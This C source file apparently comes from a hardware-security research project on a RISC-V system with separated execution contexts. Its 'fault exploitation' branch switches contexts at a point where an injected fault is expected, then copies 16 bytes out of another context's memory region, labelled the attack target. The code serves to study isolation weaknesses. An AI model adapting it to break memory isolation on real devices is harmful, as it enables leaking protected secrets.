/* Copyright 2022 Shoei Nashimoto */
/* SPDX-License-Identifier: MIT/Apache-2.0 */

#include "main3.h"
#include "../shared.h"

#define BASE_ADDR 0x80003800      // RAM for sep3 (test)
#define BASE_ADDR_TGT 0x80003000  // Attack target (sep2)
#define STR_ADDR 0x20             // Shared memory

void sep3_main() {
  // for call_app() without using stack
  uintptr_t sp, ra;
  uintptr_t *t;

  uint8_t cmd[2];
  uint16_t offset;
  uint32_t reg_val;
  static uint32_t base_addr = BASE_ADDR;

  *((uint16_t *)cmd) = *((uint16_t *)&shared_buffer[SHARED_CMD]);

  switch(cmd[0]) {
  case 0x33:
    switch(cmd[1]) {
    // set base addr
    case 0x10:
      base_addr = *(uint32_t *)&shared_buffer[SHARED_DATA]; // MEMO: little endian
      break;

    // set offset & load data
    case 0x20:
      offset = *(uint16_t *)&shared_buffer[SHARED_DATA];  // MEMO: little endian
      reg_val = *((uint32_t *)(base_addr + offset));
      // call_app(CTX_SEP3, CTX_SEP2);

      *((uint32_t *)&shared_buffer[SHARED_DATA]) = reg_val;
      break;

    // fault exploitation
    case 0xf1:
      // move offset value
      offset = *(uint16_t *)&shared_buffer[SHARED_DATA];
      *(uint16_t *)&shared_buffer[SHARED_DATA + STR_ADDR] = offset;

      /* call_app(CTX_SEP3, CTX_SEP2);  // <- fault here */
      // MEMO: avoid using stack
      __asm__ volatile ("mv %0, sp" : "=r"(sp));
      __asm__ volatile ("mv %0, ra" : "=r"(ra));

      t = (uintptr_t *)&shared_buffer[SHARED_SP];
      *t = sp; // [0:3]
      t = (uintptr_t *)&shared_buffer[SHARED_RA];
      *t = ra; // [4:7]
      shared_buffer[SHARED_CALLER] = CTX_SEP3;
      shared_buffer[SHARED_CALLEE] = CTX_SEP2;
      __asm__ volatile("ecall");

      // read 16 byte
      *((uint32_t *)&shared_buffer[SHARED_DATA+0])  = *((uint32_t *) (BASE_ADDR_TGT + *((uint16_t *)&shared_buffer[SHARED_DATA + STR_ADDR]) + 0));
      *((uint32_t *)&shared_buffer[SHARED_DATA+4])  = *((uint32_t *) (BASE_ADDR_TGT + *((uint16_t *)&shared_buffer[SHARED_DATA + STR_ADDR]) + 4));
      *((uint32_t *)&shared_buffer[SHARED_DATA+8])  = *((uint32_t *) (BASE_ADDR_TGT + *((uint16_t *)&shared_buffer[SHARED_DATA + STR_ADDR]) + 8));
      *((uint32_t *)&shared_buffer[SHARED_DATA+12]) = *((uint32_t *) (BASE_ADDR_TGT + *((uint16_t *)&shared_buffer[SHARED_DATA + STR_ADDR]) + 12));
      // MEMO: return without sp use
      shared_buffer[SHARED_CALLER] = CTX_SEP3;
      shared_buffer[SHARED_CALLEE] = CTX_END;
      __asm__ volatile("ecall");
      break;

    default:
      break;
    }
    break;

  default:
    break;
  }

  call_app(CTX_SEP3, CTX_END); // finish
}
